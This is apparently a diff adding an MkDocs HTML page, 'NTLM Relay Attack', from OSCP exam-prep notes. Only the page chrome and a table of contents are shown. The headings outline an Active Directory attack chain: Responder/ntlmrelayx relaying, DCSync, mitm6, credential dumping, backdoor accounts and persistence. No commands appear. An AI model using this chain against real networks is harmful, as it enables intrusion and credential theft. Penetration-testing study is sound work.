@@ -1,0 +1,4708 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      
+        <link rel="prev" href="../ldap-queries/">
+      
+      
+        <link rel="next" href="../smb-hash-theft/">
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.18">
+    
+    
+      
+        <title>NTLM Relay Attack - OSCP Prep Mastery</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.7e37652d.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#ntlm-relay-attack" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="OSCP Prep Mastery" class="md-header__button md-logo" aria-label="OSCP Prep Mastery" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            OSCP Prep Mastery
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              NTLM Relay Attack
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="indigo"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="OSCP Prep Mastery" class="md-nav__button md-logo" aria-label="OSCP Prep Mastery" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    OSCP Prep Mastery
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Welcome to MkDocs
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../exiftool/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Exiftool
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../exploit-helper/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Helpul things for public exploits
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../helpfull-tips/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    SSH with commandline enable
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../init-enum/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Inital Enumeration
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ligolo/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Ligolo-ng Usage
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../takeaway/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Takeaway From the reports I found
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../tmux/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Tmux Usage
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_9" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_9" id="__nav_9_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    AD
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_9_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_9">
+            <span class="md-nav__icon md-icon"></span>
+            AD
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../AD-Enumeration/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Active Directory Reconnaissance
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../add-user-to-group/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Change User Groups
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../bloodhound/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Bloodhound Stuff
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../data-issues/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Sync Date with DC
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../dcsync/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    DCSync Attack
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../force-change-password/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Force Change Password
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../generate-ntlm/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Generate NTLM Hash
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../gpo/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Abuse Windows GPO
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../inital-enum/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Inital Enumration
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ldap-queries/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    LDAP Queries
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    NTLM Relay Attack
+    
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    NTLM Relay Attack
+    
+  </span>
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#overview" class="md-nav__link">
+    <span class="md-ellipsis">
+      Overview
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#prerequisites" class="md-nav__link">
+    <span class="md-ellipsis">
+      Prerequisites
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Prerequisites">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#required-tools" class="md-nav__link">
+    <span class="md-ellipsis">
+      Required Tools
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#installation" class="md-nav__link">
+    <span class="md-ellipsis">
+      Installation
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#understanding-ntlm-relay" class="md-nav__link">
+    <span class="md-ellipsis">
+      Understanding NTLM Relay
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Understanding NTLM Relay">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#what-is-ntlm-relay" class="md-nav__link">
+    <span class="md-ellipsis">
+      What is NTLM Relay?
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#requirements-for-success" class="md-nav__link">
+    <span class="md-ellipsis">
+      Requirements for Success
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#common-attack-scenarios" class="md-nav__link">
+    <span class="md-ellipsis">
+      Common Attack Scenarios
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#reconnaissance" class="md-nav__link">
+    <span class="md-ellipsis">
+      Reconnaissance
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Reconnaissance">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#step-1-identify-targets-without-smb-signing" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step 1: Identify Targets Without SMB Signing
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-2-identify-domain-controllers" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step 2: Identify Domain Controllers
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-3-network-discovery" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step 3: Network Discovery
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#attack-execution" class="md-nav__link">
+    <span class="md-ellipsis">
+      Attack Execution
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Attack Execution">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#method-1-smb-relay-with-responder-ntlmrelayx" class="md-nav__link">
+    <span class="md-ellipsis">
+      Method 1: SMB Relay with Responder + ntlmrelayx
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Method 1: SMB Relay with Responder + ntlmrelayx">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#step-1-configure-responder" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step 1: Configure Responder
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-2-start-responder" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step 2: Start Responder
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-3-start-ntlmrelayx" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step 3: Start ntlmrelayx
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-4-trigger-authentication" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step 4: Trigger Authentication
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#method-2-ldapldaps-relay-dcsync-attack" class="md-nav__link">
+    <span class="md-ellipsis">
+      Method 2: LDAP/LDAPS Relay (DCSync Attack)
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Method 2: LDAP/LDAPS Relay (DCSync Attack)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#relay-to-ldap-for-acl-modifications" class="md-nav__link">
+    <span class="md-ellipsis">
+      Relay to LDAP for ACL Modifications
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#after-escalation-perform-dcsync" class="md-nav__link">
+    <span class="md-ellipsis">
+      After Escalation - Perform DCSync
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#method-3-mitm6-ntlmrelayx-ipv6-attack" class="md-nav__link">
+    <span class="md-ellipsis">
+      Method 3: mitm6 + ntlmrelayx (IPv6 Attack)
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Method 3: mitm6 + ntlmrelayx (IPv6 Attack)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#step-1-start-mitm6" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step 1: Start mitm6
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-2-start-ntlmrelayx-with-wpad" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step 2: Start ntlmrelayx with WPAD
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#method-4-relay-to-specific-services" class="md-nav__link">
+    <span class="md-ellipsis">
+      Method 4: Relay to Specific Services
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Method 4: Relay to Specific Services">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#httpwebdav-relay" class="md-nav__link">
+    <span class="md-ellipsis">
+      HTTP/WebDAV Relay
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#mssql-relay" class="md-nav__link">
+    <span class="md-ellipsis">
+      MSSQL Relay
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#post-exploitation" class="md-nav__link">
+    <span class="md-ellipsis">
+      Post-Exploitation
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Post-Exploitation">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#dump-credentials" class="md-nav__link">
+    <span class="md-ellipsis">
+      Dump Credentials
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#create-backdoor-accounts" class="md-nav__link">
+    <span class="md-ellipsis">
+      Create Backdoor Accounts
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#establish-persistence" class="md-nav__link">
+    <span class="md-ellipsis">
+      Establish Persistence
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pivot-through-network" class="md-nav__link">
+    <span class="md-ellipsis">
+      Pivot Through Network
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#oscp-exam-strategy" class="md-nav__link">
+    <span class="md-ellipsis">
+      OSCP Exam Strategy
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="OSCP Exam Strategy">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#phase-1-reconnaissance-5-10-minutes" class="md-nav__link">
+    <span class="md-ellipsis">
+      Phase 1: Reconnaissance (5-10 minutes)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#phase-2-setup-2-5-minutes" class="md-nav__link">
+    <span class="md-ellipsis">
+      Phase 2: Setup (2-5 minutes)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#phase-3-wait-and-exploit-variable" class="md-nav__link">
+    <span class="md-ellipsis">
+      Phase 3: Wait and Exploit (Variable)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#phase-4-post-exploitation-10-20-minutes" class="md-nav__link">
+    <span class="md-ellipsis">
+      Phase 4: Post-Exploitation (10-20 minutes)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#phase-5-lateral-movement" class="md-nav__link">
+    <span class="md-ellipsis">
+      Phase 5: Lateral Movement
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#troubleshooting" class="md-nav__link">
+    <span class="md-ellipsis">
+      Troubleshooting
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Troubleshooting">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#common-issues" class="md-nav__link">
+    <span class="md-ellipsis">
+      Common Issues
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#defense-and-mitigation" class="md-nav__link">
+    <span class="md-ellipsis">
+      Defense and Mitigation
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Defense and Mitigation">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#enable-smb-signing" class="md-nav__link">
+    <span class="md-ellipsis">
+      Enable SMB Signing
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#disable-llmnr-and-nbt-ns" class="md-nav__link">
+    <span class="md-ellipsis">
+      Disable LLMNR and NBT-NS
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#enable-ldap-signing-and-channel-binding" class="md-nav__link">
+    <span class="md-ellipsis">
+      Enable LDAP Signing and Channel Binding
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#advanced-techniques" class="md-nav__link">
+    <span class="md-ellipsis">
+      Advanced Techniques
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Advanced Techniques">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#ntlm-relay-with-delegation" class="md-nav__link">
+    <span class="md-ellipsis">
+      NTLM Relay with Delegation
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#relay-with-shadow-credentials" class="md-nav__link">
+    <span class="md-ellipsis">
+      Relay with Shadow Credentials
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#multi-relay-attack" class="md-nav__link">
+    <span class="md-ellipsis">
+      Multi-Relay Attack
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#quick-reference-commands" class="md-nav__link">
+    <span class="md-ellipsis">
+      Quick Reference Commands
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Quick Reference Commands">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#essential-commands" class="md-nav__link">
+    <span class="md-ellipsis">
+      Essential Commands
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#cheat-sheet-summary" class="md-nav__link">
+    <span class="md-ellipsis">
+      Cheat Sheet Summary
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Cheat Sheet Summary">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#pre-attack-checklist" class="md-nav__link">
+    <span class="md-ellipsis">
+      Pre-Attack Checklist
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#attack-flow" class="md-nav__link">
+    <span class="md-ellipsis">
+      Attack Flow
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#key-ntlmrelayx-options" class="md-nav__link">
+    <span class="md-ellipsis">
+      Key ntlmrelayx Options
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#post-exploitation-tools" class="md-nav__link">
+    <span class="md-ellipsis">
+      Post-Exploitation Tools
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#resources" class="md-nav__link">
+    <span class="md-ellipsis">
+      Resources
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#oscp-exam-notes" class="md-nav__link">
+    <span class="md-ellipsis">
+      OSCP Exam Notes
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../smb-hash-theft/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Grab Hash using NTLM
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_10" >
+        
+          
+          <label class="md-nav__link" for="__nav_10" id="__nav_10_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Exploits
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_10_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_10">
+            <span class="md-nav__icon md-icon"></span>
+            Exploits
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Exploits/search/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Exploit Search Methodology
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_11" >
+        
+          
+          <label class="md-nav__link" for="__nav_11" id="__nav_11_label" tabindex="0">
+            
+  
+  
